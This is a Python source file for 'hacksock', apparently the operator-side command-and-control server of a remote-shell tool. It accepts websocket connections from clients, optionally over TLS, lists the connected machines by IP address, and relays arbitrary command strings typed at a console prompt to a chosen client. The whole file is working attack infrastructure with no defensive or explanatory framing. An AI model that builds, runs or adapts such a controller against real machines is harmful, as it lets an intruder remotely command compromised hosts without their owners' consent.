import asyncio
from time import sleep
import websockets
import ssl
import pathlib
import argparse
import aioconsole
import sys

async def cmd_listener(websocket):
    global cmd
    while True:
        if cmd["client"] == "1":
            print("CMD!!")
            await websocket.send(cmd["cmd"])
            cmd = {
                    "client": None,
                    "cmd": None,
                }
                

async def connection_handler(websocket):
    global clients,cmd,c1,c2
    print(f"New Connection from {websocket.remote_address[0]} using id: {websocket.id}")
    # clients.append(websocket.id)
    #task2 = asyncio.create_task(cmd_listener(websocket))
    clients.append(websocket)
    try:
        async for message in websocket:
            if message == "endingwebsocket":
                print(f"Connection closed {websocket.remote_address[0]} using id: {websocket.id}")
                clients.remove(websocket)
                await websocket.close()
                return
            if message not in ["", " "]: print(message)
            #cmd = input(f'{websocket.id}> ')
            #await websocket.send(cmd)
    except Exception as e:
            print(e)

async def websocket_serve(ssl=False, ssl_context=None):
    if ssl:
        print("Running hacksock server in SSL mode...")
        async with websockets.serve(connection_handler, args["host"], args["port"], ssl=ssl_context):
            await asyncio.Future()  # run forever
    else:
        print("Running hacksock server in plain-text mode...")
        async with websockets.serve(connection_handler, args["host"], args["port"]):
            await asyncio.Future()  # run forever

async def main():
    global clients, cmd
    if args["ssl"]:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        path_cert = pathlib.Path(__file__).with_name("cert.pem")
        path_key = pathlib.Path(__file__).with_name("key.pem")
        ssl_context.load_cert_chain(path_cert, keyfile=path_key)
        task = asyncio.create_task(websocket_serve(ssl=True, ssl_context=ssl_context))
    else:
        task = asyncio.create_task(websocket_serve(ssl=False))
    while True:
        line = await aioconsole.ainput('#>')
        if line == "ls":
            idx = 1
            for x in clients:
                print(f"{idx} - {x.id} ({x.remote_address[0]})")
                idx += 1
        elif line == "":
            pass
        elif line == "exit":
            sys.exit(0)
        else:
            try:
                data = line.split(":",1)
                await clients[int(data[0])-1].send(data[1])
            except:
                print("Command Unknown")
    await task


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", help="Host", type=str, required=True)
    parser.add_argument("--port", help="Port", type=int, required=True)
    parser.add_argument('--ssl', action='store_true')
    args = vars(parser.parse_args())
    clients = []
    cmd = {
        "client": None,
        "cmd": None,
    }
    c1 = None
    c2 = None
    asyncio.run(main())